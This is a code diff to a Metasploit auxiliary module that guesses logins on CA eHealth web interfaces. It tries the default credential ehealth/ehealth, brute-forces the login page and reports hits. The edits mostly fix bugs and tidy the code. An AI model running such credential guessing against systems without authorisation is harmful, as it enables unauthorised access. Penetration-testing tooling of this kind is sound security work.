@@ -25,7 +25,7 @@ class Metasploit3 < Msf::Auxiliary
 			},
 			'Author'         =>
 				[
-					'KarnGaneshen[at]gmail.com',
+					'Karn Ganeshen', 'KarnGaneshen[at]gmail.com',
 				],
 			'Version'	 => '1.0',
 			'License'        => MSF_LICENSE
@@ -40,7 +40,7 @@ frames/"]))
 	end
 
 	def run_host(ip)
-		if not is_app_ehealth?
+		unless is_app_ehealth?
 			print_error("Application does not appear to be CA eHealth. Module will not continue.")
 			return
 		end
@@ -81,14 +81,14 @@ frames/"]))
 	def try_default_credential
 		user = 'ehealth'
 		pass = 'ehealth'
-		do_login(user, pass) if user and pass
+		do_login(user, pass)
 	end
 
 	#
 	# Brute-force the login page
 	#
 	def do_login(user, pass)
-		vprint_status("Trying username:'#{user}' with password:'#{pass}'")
+		vprint_status("Trying username:'#{user.inspect}' with password:'#{pass.inspect}'")
 		begin
 			res = send_request_cgi(
 			{
@@ -96,8 +96,8 @@ frames/"]))
 				'method'    => 'GET',
 				'vars_post' =>
 					{
-						'username' => 'user',
-						'password' => 'pass'
+						'username' => user,
+						'password' => pass
 					}
 			})
 
@@ -105,10 +105,10 @@ frames/"]))
 			key = doc.at_css("title").text
 
 			if (not doc or key != "eHealth [#{user}]")
-				vprint_error("FAILED LOGIN. '#{user}' : '#{pass}' with code #{res.code}")
+				vprint_error("FAILED LOGIN. '#{user.inspect}' : '#{pass.inspect}' with code #{res.code}")
 				return :skip_pass
 			else
-				print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
+				print_good("SUCCESSFUL LOGIN. '#{user.inspect}' : '#{pass.inspect}'")
 
 				report_hash = {
 					:host   => datastore['RHOST'],
@@ -123,11 +123,8 @@ frames/"]))
 				return :next_user
 			end
 
-		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-		       res = false
-		rescue ::Timeout::Error, ::Errno::EPIPE
-
-		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
+		      	res = false
 			print_error("HTTP Connection Failed, Aborting")
 			return :abort
 		end
